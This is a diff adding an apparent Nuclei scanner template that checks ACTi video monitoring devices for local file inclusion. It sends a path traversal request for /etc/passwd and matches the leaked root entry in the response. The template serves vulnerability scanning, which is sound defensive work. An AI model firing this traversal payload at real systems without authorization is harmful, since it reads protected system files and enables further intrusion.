@@ -1,0 +1,30 @@
+id: acti-video-lfi
+
+info:
+  name: ACTi-Video Monitoring - Local File Inclusion
+  author: HuanXiong
+  severity: high
+
+  tags: File Inclusion
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/images/../../../../../../../../etc/passwd"
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+
+      - type: word
+        part: header
+        words:
+          - "application/octet-stream"
+
+      - type: status
+        status:
+          - 200
+
